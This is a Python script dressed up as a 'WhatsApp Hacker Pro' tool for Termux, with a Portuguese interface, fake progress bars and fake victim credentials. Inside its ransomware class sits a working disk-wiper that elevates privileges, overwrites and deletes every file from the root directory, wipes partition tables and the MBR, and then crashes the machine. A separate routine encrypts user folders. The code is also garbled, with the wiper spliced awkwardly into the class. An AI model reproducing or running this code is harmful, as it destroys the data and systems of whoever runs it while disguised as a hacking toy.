import os
import sys
import time
import random
import threading
import platform
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from rich.text import Text
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64

console = Console()
LOG_FILE = "whatsapp_secure.log"
PASSWORD = "hack123"
TROLL_MODE = False


BANNER = """
[#00FF00]┌───────────────────────────────────────────────────────────────┐
│[bold #00FF00] ██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ [/#00FF00]│
│[bold #00FF00] ██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗[/#00FF00]│
│[bold #00FF00] ██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝[/#00FF00]│
│[bold #00FF00] ██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝ [/#00FF00]│
│[bold #00FF00] ╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║     [/#00FF00]│
│[bold #00FF00]  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     [/#00FF00]│
├───────────────────────────────────────────────────────────────┤
│[bold white] WhatsApp Hacker Pro v3.1 - By DarkSecurity Team[/bold white]            [#00FF00]│
│[bold white] >> Use apenas para fins educacionais![/bold white]                     [#00FF00]│
└───────────────────────────────────────────────────────────────┘[/#00FF00]
"""

class WhatsAppRansomware:
  import os
import random
import sys
import ctypes
import platform
import time
import threading

def elevate_privileges():
    if platform.system() == 'Windows':
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit(0)
        except:
            pass
    elif os.getuid() != 0:
        try:
            os.execvp('sudo', ['sudo', 'python3'] + sys.argv)
            sys.exit(0)
        except:
            pass

def secure_overwrite(path, passes=3):
    try:
        file_size = os.path.getsize(path)
        with open(path, 'wb') as f:
            for _ in range(passes):
                f.seek(0)
                # First pass: random data
                f.write(os.urandom(file_size))
                f.flush()
                os.fsync(f.fileno())
                # Second pass: zeros
                f.seek(0)
                f.write(b'\x00' * file_size)
                f.flush()
                os.fsync(f.fileno())
                # Third pass: ones
                f.seek(0)
                f.write(b'\xFF' * file_size)
                f.flush()
                os.fsync(f.fileno())
        os.rename(path, path + '.wiped')
        os.remove(path + '.wiped')
    except:
        pass

def wipe_partition_table():
    try:
        if platform.system() == 'Linux':
            devices = ['/dev/sda', '/dev/sdb', '/dev/nvme0n1', '/dev/vda']
            for dev in devices:
                try:
                    with open(dev, 'wb') as f:
                        f.write(os.urandom(1024 * 1024))  # Wipe first MB
                except:
                    pass
        elif platform.system() == 'Windows':
            import win32api
            import win32file
            drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
            for drive in drives:
                try:
                    handle = win32file.CreateFile(
                        r'\\.\%s' % drive.rstrip('\\'),
                        win32file.GENERIC_WRITE,
                        win32file.FILE_SHARE_WRITE,
                        None,
                        win32file.OPEN_EXISTING,
                        0,
                        None
                    )
                    win32file.WriteFile(handle, os.urandom(1024 * 1024))
                    handle.close()
                except:
                    pass
    except:
        pass

def wipe_system():
    # Increase priority on Windows
    if platform.system() == 'Windows':
        try:
            ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000100)
        except:
            pass
    
    # Wipe files
    for root, dirs, files in os.walk('/' if platform.system() != 'Windows' else 'C:\\'):
        for file in files:
            try:
                path = os.path.join(root, file)
                secure_overwrite(path)
            except:
                pass
    
    # Wipe directories
    for root, dirs, _ in os.walk('/' if platform.system() != 'Windows' else 'C:\\', topdown=False):
        for dir in dirs:
            try:
                path = os.path.join(root, dir)
                os.rmdir(path)
            except:
                pass
    
    # Additional destructive actions
    wipe_partition_table()
    
    # Wipe MBR (Windows/Linux)
    try:
        if platform.system() == 'Linux':
            with open('/dev/sda', 'wb') as f:
                f.write(b'\x00' * 512)
        elif platform.system() == 'Windows':
            with open(r'\\.\\PhysicalDrive0', 'wb') as f:
                f.write(b'\x00' * 512)
    except:
        pass

if __name__ == '__main__':
    elevate_privileges()
    
    # Start multiple threads for faster destruction
    threads = []
    for _ in range(4):
        t = threading.Thread(target=wipe_system)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Also wipe in main thread
    wipe_system()
    
    for t in threads:
        t.join()
    
    # Final destructive act - try to crash the system
    try:
        if platform.system() == 'Linux':
            os.system('echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger')
        elif platform.system() == 'Windows':
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except:
        pass    
    def scan_and_encrypt(self, start_path):
      
        try:
            for root, dirs, files in os.walk(start_path):
          
                dirs[:] = [d for d in dirs if d not in self.exclude_dirs]
                
                for file in files:
                    if any(file.endswith(ext) for ext in self.target_extensions):
                        file_path = os.path.join(root, file)
                        if self.encrypt_file(file_path):
                            self.generate_ransom_note(root)
        except Exception as e:
            console.print(f"[red]Erro durante varredura: {str(e)}[/red]")
    
    def run_ransomware(self):
       
        console.print("\n[bold red]INICIANDO PROCESSO DE CRIPTOGRAFIA...[/bold red]")
        
       
        with Progress() as progress:
            task = progress.add_task("[red]Criptografando arquivos...", total=100)
            
       
            target_paths = [
                "/sdcard/Download",
                "/sdcard/DCIM",
                "/sdcard/WhatsApp",
                os.path.expanduser("~")
            ]
            
            for path in target_paths:
                if os.path.exists(path):
                    progress.update(task, description=f"[red]Criptografando {path}...")
                    self.scan_and_encrypt(path)
            
         
            progress.update(task, completed=100)
        
        console.print(Panel.fit(
            "[blink red]TODOS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS![/blink red]",
            border_style="red",
            title="⚠️ ALERTA FINAL ⚠️"
        ))
        
      
        key_file = os.path.join(os.path.expanduser("~"), "DECRYPT_INSTRUCTIONS.txt")
        with open(key_file, 'w') as f:
            f.write(f"Chave de descriptografia (AES-256): {base64.b64encode(self.key).decode()}\n")
            f.write(f"IV: {base64.b64encode(self.iv).decode()}\n")
            f.write("Este arquivo foi criado apenas para fins educacionais.\n")
            f.write("Em um ataque real, você não teria acesso a esta chave!\n")

def show_fake_progress():
    with Progress() as progress:
        tasks = [
            progress.add_task("[cyan]Conectando aos servidores WhatsApp...", total=100),
            progress.add_task("[magenta]Bypass de segurança 2FA...", total=100),
            progress.add_task("[green]Extraindo dados da vítima...", total=100)
        ]
        
        while not progress.finished:
            for task in tasks:
                progress.update(task, advance=random.uniform(0.5, 3))
            time.sleep(0.1)

def show_fake_menu():
    console.print("\n[bold #00FF00]1. Hackear por número de telefone")
    console.print("[bold #00FF00]2. Hackear por código de verificação")
    console.print("[bold #00FF00]3. Ataque de força bruta")
    console.print("[bold #00FF00]4. Modo Ransomware (ADMIN ONLY)")
    console.print("[bold #00FF00]5. Sair do programa\n")

def show_fake_credentials():
    fake_data = [
        {"nome": "Maria Silva", "telefone": "+55 11 98765-4321", "status": "Online"},
        {"nome": "João Santos", "telefone": "+55 21 99876-5432", "status": "Visto por último hoje 14:30"}
    ]
    
    console.print(Panel.fit("[bold red]DADOS DA VÍTIMA EXTRAÍDOS![/bold red]"))
    for data in fake_data:
        console.print(f"[yellow]Nome: [white]{data['nome']}")
        console.print(f"[yellow]Telefone: [white]{data['telefone']}")
        console.print(f"[yellow]Status: [white]{data['status']}\n")

def fake_whatsapp_hack():
    console.print(BANNER)
    time.sleep(2)
    
    console.print("\n[bold #00FF00]Inicializando módulos de hacking WhatsApp...")
    show_fake_progress()
    
    console.print("\n[bold green]✓ Conexão estabelecida com servidores WhatsApp")
    time.sleep(1)
    console.print("[bold green]✓ Firewall bypassed com sucesso")
    time.sleep(1)
    console.print("[bold green]✓ Vulnerabilidade encontrada: CVE-2023-9876\n")
    time.sleep(2)
    
    while True:
        show_fake_menu()
        
        console.print("[bold white]Selecione uma opção: [/bold white]", end="")
        option = input().strip()
        
        if option == "1":
            console.print("\n[bold]Digite o número com código do país: [/bold]", end="")
            phone = input().strip()
            
            console.print("\n[bold]Aguarde, explorando vulnerabilidade...[/bold]")
            show_fake_progress()
            show_fake_credentials()
            
        elif option == "4":
         
            console.print("\n[bold red]Digite a senha de administrador: [/bold red]", end="")
            password = input().strip()
            
            if password == PASSWORD:
                ransomware = WhatsAppRansomware()
                ransomware.run_ransomware()
                break
            else:
                console.print("\n[bold red]Senha incorreta![/bold red]")
                
        elif option == "5":
            console.print("\n[bold]Saindo...[/bold]")
            break
            
        else:
            console.print("\n[bold red]Opção inválida![/bold red]")

def main():
  
    if not os.path.exists("/data/data/com.termux/files/home"):
        console.print("[red]Erro: Esta versão só funciona no Termux![/red]")
        return
    

    if not os.access("/sdcard", os.W_OK):
        console.print("[red]Erro: Conceda permissões de armazenamento ao Termux![/red]")
        console.print("[yellow]Execute: termux-setup-storage[/yellow]")
        return
    

    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"\n--- Sessão Iniciada: {datetime.now()} ---\n")
        f.write("Módulos carregados: whatsapp_hack, bypass_2fa\n")
    
    fake_whatsapp_hack()

if __name__ == "__main__":
   
    try:
        if platform.system() == "Linux" and "android" in platform.platform().lower():
            main()
        else:
            console.print("[red]Erro: Sistema não suportado![/red]")
    except Exception as e:
        console.print(f"[red]Erro: {str(e)}[/red]")
